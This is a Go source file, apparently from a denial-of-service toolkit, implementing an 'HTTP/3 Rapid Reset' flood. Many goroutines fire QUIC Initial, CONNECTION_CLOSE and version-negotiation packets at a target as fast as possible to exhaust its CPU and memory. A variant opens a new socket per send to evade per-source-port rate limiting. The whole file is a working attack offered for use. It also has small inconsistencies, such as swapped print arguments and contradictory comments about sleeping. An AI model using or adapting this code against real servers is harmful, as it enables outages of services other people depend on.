// http3_reset.go — HTTP/3 Rapid Reset Attack.
//
// Mechanism:
//   Sends real RFC 9000 QUIC Initial packets (ClientHello equivalent),
//   immediately followed by QUIC CONNECTION_CLOSE (0x1c) frames.
//
//   This forces the QUIC server to:
//     1. Parse the Initial packet and allocate connection state
//     2. Begin TLS handshake processing
//     3. Receive CONNECTION_CLOSE → abort and clean up immediately
//     4. Repeat at maximum rate
//
//   The setup+teardown cycle is the most CPU-intensive part of QUIC.
//   At high concurrency this causes:
//     - QUIC crypto goroutine exhaustion (Go-based servers: quic-go, nghttp3)
//     - Key-schedule computation overhead (TLS 1.3 per connection)
//     - Memory pressure from repeated connection struct allocation/deallocation
//
//   No simulated sleep — real UDP, real QUIC PDUs, maximum send rate.
//   Each goroutine reuses one UDP socket per thread (reduces kernel overhead).
package main

import (
	"fmt"
	mrand "math/rand"
	"net"
	"strings"
	"sync"
	"time"
	"context"
)

// startHTTP3RapidReset fires QUIC Initial+ConnectionClose cycles at the target.
//
// Each goroutine:
//   1. Resolves the target once and opens a single UDP socket
//   2. Loops: build fresh QUIC Initial → send → send CONNECTION_CLOSE → repeat
//
// Thread-per-socket model avoids per-packet syscall overhead of DialUDP in a loop.
func startHTTP3RapidReset(ctx context.Context, opts ContextOpts, targetURL string, threads int, duration time.Duration, pps int) {
	fmt.Printf("[H3RR] HTTP/3 Rapid Reset on %s | threads=%d | dur=%v | pps=%d\n",
		targetURL, duration, threads, pps)

	// ── Resolve host:port ─────────────────────────────────────────────────────
	host := targetURL
	for _, pfx := range []string{"https://", "http://", "h3://"} {
		if strings.HasPrefix(host, pfx) {
			host = host[len(pfx):]
			break
		}
	}
	// Strip path
	if idx := strings.Index(host, "/"); idx >= 0 {
		host = host[:idx]
	}
	// Strip query
	if idx := strings.Index(host, "?"); idx >= 0 {
		host = host[:idx]
	}
	// Ensure port
	if _, _, err := net.SplitHostPort(host); err != nil {
		host = host + ":443"
	}

	serverAddr, err := net.ResolveUDPAddr("udp", host)
	if err != nil {
		fmt.Printf("[H3RR] Cannot resolve %s: %v\n", host, err)
		return
	}

	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(workerID int) {
		defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in anonymous goroutine: %v", r) } }()
			defer wg.Done()

			// One UDP socket per goroutine — kernel keeps state at socket level
			conn, err := opts.NetTarget.DialUDP("udp", nil, serverAddr)
			if err != nil {
				return
			}
			defer conn.Close()

			src := mrand.NewSource(time.Now().UnixNano() + int64(workerID))
			localRand := mrand.New(src)

			// Extended deadline — goroutine lives for full duration
			conn.SetDeadline(time.Now().Add(duration + 10*time.Second))

			for {
				select {
				case <-ctx.Done():
					return
				default:
					if pps > 0 {
						time.Sleep(time.Second / time.Duration(pps/threads+1))
					}
				}

				// ── Phase A: Send QUIC Initial (ClientHello) ─────────────────
				// Server allocates connection state, starts TLS key derivation
				initPkt := buildQUICInitial(localRand)
				if _, err := conn.Write(initPkt); err != nil {
					// Socket dead — exit goroutine (timer will catch us)
					return
				}
				AddStats(1, int64(len(initPkt)))

				// ── Phase B: Send CONNECTION_CLOSE (immediate) ────────────────
				// Frame type 0x1c: QUIC APPLICATION_CLOSE
				// error_code=0 (NO_ERROR), reason_phrase_length=0
				// Server must process this and tear down the connection immediately
				ccPkt := buildQUICConnectionClose(localRand)
				conn.Write(ccPkt)
				AddStats(1, int64(len(ccPkt)))

				// ── Phase C: Retry probe with unknown version ─────────────────
				// Forces Version Negotiation response — extra server CPU
				vnPkt := buildQUICVersionNegProbe(localRand)
				conn.Write(vnPkt)
				AddStats(1, int64(len(vnPkt)))

				// No sleep. We want maximum packets per second per goroutine.
				// The kernel's UDP send buffer is the only throttle.
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	fmt.Println("[H3RR] HTTP/3 Rapid Reset finished")
}

// startHTTP3RapidResetMultiSocket creates one UDP socket per send to maximise
// kernel-level parallelism on targets that rate-limit per source port.
// Use this as an alternative when the default goroutine-per-socket mode is
// less effective (e.g. target has eBPF rate-limiting per source port).
func startHTTP3RapidResetMultiSocket(ctx context.Context, opts ContextOpts, targetURL string, threads int, duration time.Duration) {
	host := targetURL
	for _, pfx := range []string{"https://", "http://", "h3://"} {
		if strings.HasPrefix(host, pfx) {
			host = host[len(pfx):]
			break
		}
	}
	if idx := strings.Index(host, "/"); idx >= 0 {
		host = host[:idx]
	}
	if _, _, err := net.SplitHostPort(host); err != nil {
		host = host + ":443"
	}
	serverAddr, err := net.ResolveUDPAddr("udp", host)
	if err != nil {
		return
	}

	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(workerID int) {
		defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in anonymous goroutine: %v", r) } }()
			defer wg.Done()
			src := mrand.NewSource(time.Now().UnixNano() + int64(workerID))
			localRand := mrand.New(src)
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				// New socket each iteration → random source port
				conn, err := opts.NetTarget.DialUDP("udp", nil, serverAddr)
				if err != nil {
					time.Sleep(1 * time.Millisecond)
					continue
				}
				conn.Write(buildQUICInitial(localRand))
				conn.Write(buildQUICConnectionClose(localRand))
				conn.Close()
				AddStats(2, 1250)
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
}
